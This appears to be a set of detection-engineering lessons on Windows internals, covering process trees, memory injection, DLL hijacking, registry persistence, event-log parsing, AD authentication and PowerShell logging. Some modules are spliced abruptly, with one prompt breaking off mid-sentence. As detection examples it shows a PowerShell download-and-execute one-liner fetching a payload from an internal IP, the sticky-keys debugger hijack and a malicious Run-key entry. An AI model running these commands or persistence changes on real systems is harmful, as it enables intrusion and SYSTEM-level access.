Concept 1 — The Process Tree: Every Process Has a Parent

When Windows starts a program, it creates a process. Every process (except System) has a parent — the process that spawned it. This relationship forms a tree. As a detection engineer, anomalies in this tree are one of your most reliable signals.

Data engineering analogy: think of the process tree as a job dependency graph in Airflow or Control-M. Each job has a parent trigger. If a job that should be triggered by the scheduler instead appears to have been launched by an HTTP endpoint, something is wrong. Same logic applies to processes.

Key parent→child relationships that are normal:

  • explorer.exe → user applications (Word, Chrome, etc.)
  • services.exe → Windows services
  • svchost.exe → hosted service DLLs
  • wininit.exe → services.exe, lsass.exe, winlogon.exe

Relationships that are anomalous and trigger detections:

  • Word.exe → powershell.exe (macro executing PowerShell)
  • explorer.exe → cmd.exe → net.exe (interactive shell spawned from desktop app)
  • svchost.exe → powershell.exe (service spawning a shell)

Example:

Normal:
  wininit.exe (PID 456)
    └── services.exe (PID 512)
          └── svchost.exe (PID 1024)

Suspicious (living-off-the-land attack):
  winword.exe (PID 3344)
    └── cmd.exe (PID 4012)          ← macro spawned a shell
          └── powershell.exe (PID 4108)
                └── net.exe (PID 4204)  ← discovering AD groups

Exercise: Open Task Manager → Details tab, or run Get-Process | Select-Object Name, Id, @{n='ParentId';e={(Get-WmiObject Win32_Process -Filter "ProcessId=$($_.Id)").ParentProcessId}} in PowerShell. Find three processes and identify their parent. Look for any process where the parent does not match the expected relationship listed above. Expected output: a table of ProcessName, PID, ParentPID with at least one row where you can explain why the relationship is normal.

Concept 2 — Memory Regions: Stack, Heap, and Injected Code

A process has a virtual address space divided into regions. The operating system tracks each region: where it is, how big it is, and what permissions it has (read/write/execute). Legitimate code lives in fixed, named regions loaded from disk (.exe, .dll files). Injected code often appears as anonymous MEM_PRIVATE regions with execute permission — a red flag.

Data engineering analogy: this is like a pipeline run with unexpected in-memory state. You expect your Spark job to load data from known S3 paths. If you detect a large anonymous memory block holding executable code, it is the equivalent of a query reading from a temp table that nobody created.

Detection technique: scan for memory regions that are:

  1. MEM_PRIVATE (not backed by a file on disk)
  2. PAGE_EXECUTE_READWRITE (writable AND executable — normal code is never both)
  3. Larger than a few KB

Tools: Process Hacker (GUI), Volatility malfind (memory forensics, covered W17).

Example:

# Simplified memory map — two regions from the same process
Region 1:
  Base:        0x00007FF6A0000000
  Type:        MEM_IMAGE          ← backed by notepad.exe on disk — normal
  Protect:     PAGE_EXECUTE_READ
  Mapped file: C:\Windows\notepad.exe

Region 2:
  Base:        0x0000023F45C00000
  Type:        MEM_PRIVATE        ← anonymous, not backed by any file
  Protect:     PAGE_EXECUTE_READWRITE  ← RWXP = suspicious
  Size:        98304 bytes
  # This is what process injection looks like in memory

Exercise: Download Process Hacker 2 (free, portable — processhacker.sourceforge.net). Open it, right-click any running process (try notepad.exe), choose Properties → Memory. Find one MEM_IMAGE region and one MEM_PRIVATE region. Note whether any MEM_PRIVATE region has Execute permission. Expected output: two rows from the memory table — one MEM_IMAGE, one MEM_PRIVATE — with their protection flags noted.

Concept 3 — DLL Loading and DLL Hijacking

Windows programs load shared code from Dynamic Link Libraries (DLLs). When a program calls LoadLibrary("example.dll"), Windows searches for the file in a specific order: the application directory first, then System32, then the PATH. An attacker who places a malicious DLL in the application directory before the legitimate one gets their code executed — this is DLL hijacking.

Data engineering analogy: this is exactly like Python import path manipulation. If you run python app.py from a directory containing a file named requests.py, Python imports your file instead of the real requests library. DLL hijacking is the Windows equivalent at the OS level.

Example:

# Legitimate DLL load order for C:\Program Files\App\app.exe:
# 1. C:\Program Files\App\           ← checked FIRST
# 2. C:\Windows\System32\
# 3. C:\Windows\
# 4. C:\Windows\SysWOW64\
# 5. PATH directories

# Hijack scenario:
# Attacker drops C:\Program Files\App\version.dll
# (legitimate version.dll lives in System32)
# app.exe calls LoadLibrary("version.dll")
# → loads the attacker's version FIRST
# → attacker's code runs with app.exe's privileges

# Detection: look for DLL loads from unexpected paths
# Sysmon Event ID 7 (Image Loaded) with ImageLoaded path != expected system path

Exercise: Using Sysmon (or reviewing a pre-collected EVTX sample), filter for Event ID 7 (ImageLoaded). Find any DLL loaded from a path outside C:\Windows\System32 or C:\Program Files. Write a note on whether the load path looks legitimate (e.g., a game's own DLL folder) or suspicious. Expected output: one Sysmon Event ID 7 entry with the image path, loaded DLL path, and your assessment.

LLM Integration

Topic: LLMs for process tree anomaly triage Threat: An attacker uses an LLM to generate process names that closely resemble legitimate Windows processes (e.g., svch0st.exe, lsas.exe) to evade name-based detection rules. Opportunity: Feed a process tree as JSON to an LLM and ask it to flag parent-child relationships that deviate from known-good baselines. The LLM can explain why each anomaly is suspicious in plain English — useful for L1 analysts. Prompt to try: "Here is a Windows process tree as JSON: [paste tree]. Concept 1 — Registry Structure: Hives, Keys, and Values

The Windows Registry is a hierarchical database that stores configuration for the OS and applications. Think of it as a key-value store — similar to Redis or a configuration YAML file — but persistent, structured in a tree, and deeply integrated into every Windows process.

Registry hives (top-level namespaces):

  • HKEY_LOCAL_MACHINE (HKLM) — machine-wide settings, services, drivers
  • HKEY_CURRENT_USER (HKCU) — current user's settings
  • HKEY_USERS (HKU) — all user profiles
  • HKEY_CLASSES_ROOT (HKCR) — file type associations, COM objects

Data engineering analogy: HKLM is like a system-level config table readable by all pipeline workers. HKCU is like a per-user settings table in a multi-tenant database. The paths in the Registry are like database keys: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run is the key that specifies which programs start automatically on boot.

Example:

# Registry path structure:
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# This key holds auto-start programs (persistence mechanism):
# Value Name: "SecurityHealth"
# Value Type: REG_SZ (string)
# Value Data: "C:\Windows\System32\SecurityHealthSystray.exe"

# Attacker persistence — adding a malicious entry:
# Value Name: "Updater"
# Value Data: "C:\Users\user\AppData\Local\Temp\update.exe"
# ← unusual path, not a Windows system directory

Exercise: Open regedit.exe and navigate to: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run and HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

List every value in both keys. For each entry, note the program name and the path it points to. Flag any entry where the path is in %TEMP%, %APPDATA%, or any user-writable directory. Expected output: a list of 3–8 auto-start entries with path and a "suspicious/normal" assessment.

Concept 2 — Key Persistence Locations

Attackers use specific registry keys to survive reboots. These are called persistence locations. As a detection engineer, you need to know the top 10 by heart — they are the first places checked during incident response.

Data engineering analogy: persistence in the registry is like a scheduled job in Airflow or Control-M that has been injected into the scheduler's DAG store. The job runs on every system start without the administrator's knowledge.

Top persistence registry keys:

  • HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run — runs at every logon
  • HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run — same, per-user
  • HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon (Userinit, Shell) — runs at logon shell init
  • HKLM\SYSTEM\CurrentControlSet\Services — Windows services
  • HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{exe} — Debugger key hijacking
  • HKCU\SOFTWARE\Classes\*\shell\open\command — file association hijacking

Example:

# Image File Execution Options hijack:
# An attacker sets the debugger for sethc.exe (sticky keys accessibility tool)
# This gives a SYSTEM shell from the logon screen

HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe
  Debugger = "C:\Windows\System32\cmd.exe"

# Now pressing Shift 5 times at the Windows login screen opens cmd.exe as SYSTEM
# Detection: alert on any new Debugger value set under Image File Execution Options

Concept 3 — Registry Monitoring and Alerting


Sysmon Event ID 12 (Registry key created/deleted) and Event ID 13 (Registry value set) let you monitor registry changes in real time. Combined with known persistence key paths, these events form the basis of persistence detection rules.


Data engineering analogy: this is equivalent to CDC (Change Data Capture) on a configuration database. You are streaming every INSERT and UPDATE from the config store into your SIEM, then filtering for rows that match known bad patterns.


Example:

Concept 1 — Event Log Architecture and Key Channels


Windows Event Logs are stored in .evtx files. Each log channel covers a specific system area. The three channels every analyst monitors:


    

  • Security (Security.evtx) — authentication, account changes, privilege use
    • 

  • System (System.evtx) — OS-level events: services, crashes, hardware
    • 

  • Application (Application.evtx) — application events
    • 



Additional channels critical for detection:


    

  • Microsoft-Windows-Sysmon/Operational — Sysmon telemetry (process, network, registry, file)
    • 

  • Microsoft-Windows-PowerShell/Operational — PowerShell script block logging
    • 

  • Microsoft-Windows-TaskScheduler/Operational — scheduled task creation/execution
    • 



Data engineering analogy: think of each channel as a Kafka topic. The Security channel is your high-throughput authentication topic. Sysmon is your detailed process telemetry topic. Your SIEM is the consumer group that aggregates, correlates, and alerts across all topics.

Concept 2 — Parsing EVTX Files with Python


python-evtx lets you parse .evtx files programmatically. Each event is XML. You extract fields by parsing the XML and flattening them into a dict or DataFrame. This is the foundation of the W02 Royal Road artifact.


Data engineering analogy: .evtx parsing is exactly like reading a semi-structured XML data dump from an ERP system. You write a parser that extracts the fields you care about, normalizes the schema, and outputs a clean structured format for downstream analysis.


Example:


import Evtx.Evtx as evtx
import xml.etree.ElementTree as ET

def parse_evtx(path: str) -> list[dict]:
    records = []
    with evtx.Evtx(path) as log:
        for record in log.records():
            try:
                root = ET.fromstring(record.xml())
                ns = {"w": "http://schemas.microsoft.com/win/2004/08/events/event"}
                event_id = root.find(".//w:EventID", ns).text
                time_created = root.find(".//w:TimeCreated", ns).attrib.get("SystemTime", "")
                data = {c.attrib.get("Name", f"Data_{i}"): c.text
                        for i, c in enumerate(root.findall(".//w:Data", ns))}
                records.append({"EventID": event_id, "Time": time_created, **data})
            except Exception:
                pass
    return records

# Usage:
rows = parse_evtx("Security.evtx")
print(rows[0])
# {'EventID': '4624', 'Time': '2024-01-15T09:00:00.000000Z',
#  'SubjectUserName': 'SYSTEM', 'TargetUserName': 'bob', 'LogonType': '3', ...}

Concept 3 — Building a Detection Query from Event Logs


A detection rule, at its core, is a filter on a stream of events. You define the condition (what pattern looks bad), and the rule fires whenever the condition is met. The simplest form is: filter by EventID, then filter by field values.


Data engineering analogy: a detection rule is a SQL WHERE clause on your event log table. The SIEM is the query engine. The alert is a trigger that fires when SELECT COUNT(*) > 0.


Example:


import pandas as pd

# Assume rows is a list of dicts from parse_evtx() above
df = pd.DataFrame(rows)

# Detection: password spray — same source IP with 10+ failed logons
# to different usernames within 5 minutes
failed = df[df["EventID"] == "4625"].copy()
failed["Time"] = pd.to_datetime(failed["Time"])
failed = failed.sort_values("Time")

spray_candidates = (
    failed.groupby("IpAddress")
    .apply(lambda g: g.set_index("Time")
           .resample("5min")["TargetUserName"]
           .nunique())
    .reset_index()
)
spray_candidates.columns = ["IpAddress", "Window", "UniqueUsers"]
alerts = spray_candidates[spray_candidates["UniqueUsers"] >= 10]
print(alerts)

Editable. Blocks on a page share one session, so run them in order.

Concept 1 — Active Directory Structure: Domains, OUs, and GPOs


Active Directory (AD) is the identity and access management backbone of most enterprise Windows environments. It stores user accounts, computer accounts, and security groups, and enforces policies via Group Policy Objects (GPOs).


Key concepts:


    

  • Domain: the top-level AD namespace (e.g., corp.example.com). All objects live in a domain.
    • 

  • Domain Controller (DC): the server that runs AD. Every authentication request goes through the DC.
    • 

  • Organizational Unit (OU): a container for organizing users and computers (like a folder in a file system).
    • 

  • GPO: a policy object attached to an OU or domain that enforces settings (e.g., disable USB drives, require screen lock).
    • 



Data engineering analogy: Active Directory is like a centralized IAM service for your data platform. The domain is your AWS account or GCP project. OUs are IAM groups. GPOs are IAM policies applied at the group level. The Domain Controller is the IAM API endpoint that every service calls to verify "is this principal allowed to do this action?"


Example:


Domain: corp.example.com
├── OU: Servers
│   ├── Computer: DC01 (Domain Controller)
│   ├── Computer: SQL01
│   └── GPO: Disable RDP from internet
│
├── OU: Users
│   ├── OU: IT
│   │   ├── User: alice (Domain Admin)
│   │   └── GPO: Allow PowerShell remoting
│   └── OU: Finance
│       ├── User: bob
│       └── GPO: Block USB drives
│
└── Security Group: Domain Admins
    └── Member: alice

Concept 2 — NTLM Authentication: How It Works and Where It Breaks


NTLM (NT LAN Manager) is a challenge-response authentication protocol. The client proves identity by hashing a server-issued challenge with the user's password hash — the password never travels the network. However, NTLM has critical weaknesses that are heavily exploited.


Data engineering analogy: NTLM is like an API that authenticates with a signed HMAC token rather than sending the API key directly. Secure in transit, but if an attacker captures the HMAC token (the hash), they can replay it without knowing the original secret. This is exactly Pass-the-Hash.


NTLM flow:


    

  1. Client requests authentication
    2. 

  2. Server sends a random challenge (nonce)
    3. 

  3. Client computes: HMAC-MD5(NT hash of password, challenge) → response
    4. 

  4. Server sends challenge + response to the DC, which verifies
    5. 



Attack: Pass-the-Hash — if an attacker extracts the NT hash from memory (via Mimikatz), they can authenticate as that user without knowing the plaintext password.


Example:


# NTLM authentication sequence (simplified):

Client → Server:  "I want to authenticate as bob"
Server → Client:  "Here is challenge: 0xA3F2B891C044D2E1"
Client → Server:  NTLMv2_Response = HMAC-MD5(NT_hash_of_bob_password, challenge)
Server → DC:      "Is this response valid for bob with this challenge?"
DC → Server:      "Yes" / "No"

# Pass-the-Hash attack:
# Attacker has: NT hash = aad3b435b51404eeaad3b435b51404ee (dumped from lsass)
# Attacker sends the hash directly in step 3 — no password needed
# Detection: Event ID 4624 with LogonType=3 and AuthenticationPackageName=NTLM
#            from an account that normally uses Kerberos

Concept 3 — Kerberos: Tickets, TGTs, and Golden Ticket Attacks


Kerberos is the preferred authentication protocol in modern AD environments. It uses tickets instead of challenge-response. Understanding the flow is essential for detecting Golden Ticket and Silver Ticket attacks.


Kerberos flow:


    

  1. User logs in → sends password hash to DC's Authentication Service (AS)
    2. 

  2. AS verifies the hash → issues a Ticket Granting Ticket (TGT) (valid 10 hours, encrypted with krbtgt account hash)
    3. 

  3. To access a service, client sends TGT to Ticket Granting Service (TGS)
    4. 

  4. TGS issues a Service Ticket for the target resource
    5. 

  5. Client presents Service Ticket to the resource
    6. 



Golden Ticket attack: if an attacker obtains the krbtgt hash, they can forge TGTs for any user with any group membership — bypassing all authentication for the entire domain.


Example:


# Kerberos Event IDs:
4768 — TGT requested (AS-REQ/AS-REP) — user logging in
4769 — Service ticket requested (TGS-REQ/TGS-REP) — user accessing a service
4771 — Kerberos pre-authentication failed — wrong password
4776 — NTLM authentication attempt (fallback from Kerberos)

# Golden Ticket detection signals (difficult — ticket is valid):
# - TGT with lifetime > 10 hours (default max)
# - TGT for a user that has no corresponding 4768 logon event on any DC
# - Ticket encryption type = RC4-HMAC (older, weaker) when AES256 is the domain standard
# - Source IP that is not in the domain's normal subnet range

Concept 1 — PowerShell as an Attack Tool and Why It Is Hard to Block


PowerShell is a legitimate, powerful administration tool built into every Windows installation. Attackers love it because: it is always present, it can download and execute code from memory (never touching disk), it has access to the full .NET framework, and many organizations have policies that allow it.


Defensive logging makes PowerShell a goldmine for detection when configured correctly.


Data engineering analogy: PowerShell in the hands of an attacker is like unrestricted access to your Python environment in a data pipeline. An admin can call EXEC sp_executesql to run arbitrary SQL; PowerShell lets an attacker run arbitrary OS commands. You cannot remove either — but you can log every invocation.


Three PowerShell logging settings (all off by default, all should be enabled):


    

  1. Module Logging — logs pipeline execution output per module
    2. 

  2. Script Block Logging — logs every executed script block (most valuable; logs de-obfuscated code)
    3. 

  3. Transcription — saves session transcript to a file (useful for IR but not real-time)
    4. 



Example:


# Enabling Script Block Logging via GPO registry key:
# HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
#   EnableScriptBlockLogging = 1
#   EnableScriptBlockInvocationLogging = 1

# Event ID 4104 — Script block logged:
# Channel: Microsoft-Windows-PowerShell/Operational
{
  "EventID": 4104,
  "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/payload.ps1')",
  "Path": "",            # no file path = run from memory, not from disk
  "ScriptBlockId": "abc-123",
  "MessageNumber": 1,
  "MessageTotal": 1
}
# IEX = Invoke-Expression = execute arbitrary code
# DownloadString = download from URL
# No Path = fileless execution

Concept 3 — Building an EVTX → JSON Pipeline (Royal Road Foundation)


Parsing Windows Event Logs into a structured format is a core detection engineering skill. The output of this pipeline feeds every downstream analysis step: detection rules, behavioral baselines, IR triage, ML models.


This concept builds the W02 Royal Road artifact: a Python script that reads an .evtx file, parses every event into a normalized dict, and writes a JSON Lines file.


Example:


import Evtx.Evtx as evtx
import xml.etree.ElementTree as ET
import json
from pathlib import Path

NS = {"w": "http://schemas.microsoft.com/win/2004/08/events/event"}

def evtx_to_jsonl(src: str, dst: str) -> int:
    count = 0
    with open(dst, "w", encoding="utf-8") as out:
        with evtx.Evtx(src) as log:
            for record in log.records():
                try:
                    root = ET.fromstring(record.xml())
                    sys_node = root.find("w:System", NS)
                    event_id   = sys_node.find("w:EventID", NS).text
                    time_str   = sys_node.find("w:TimeCreated", NS).attrib.get("SystemTime", "")
                    channel    = sys_node.find("w:Channel", NS).text
                    computer   = sys_node.find("w:Computer", NS).text
                    data_fields = {
                        c.attrib.get("Name", f"Field{i}"): c.text
                        for i, c in enumerate(root.findall(".//w:Data", NS))
                    }
                    row = {
                        "event_id": event_id,
                        "time":     time_str,
                        "channel":  channel,
                        "computer": computer,
                        **data_fields
                    }
                    out.write(json.dumps(row) + "\n")
                    count += 1
                except Exception:
                    pass
    return count

Topic: LLMs for PowerShell de-obfuscation and triage
Threat: Attackers use increasingly sophisticated PowerShell obfuscation: nested Invoke-Expression, character substitution, string reversal, XOR encoding. An LLM-based triage tool that only looks for known keywords will miss novel obfuscation techniques.
Opportunity: Send an obfuscated PowerShell script block to an LLM and ask it to de-obfuscate and explain what the code does. This is faster than manual reversing for L1/L2 analysts and captures intent that keyword matching misses.
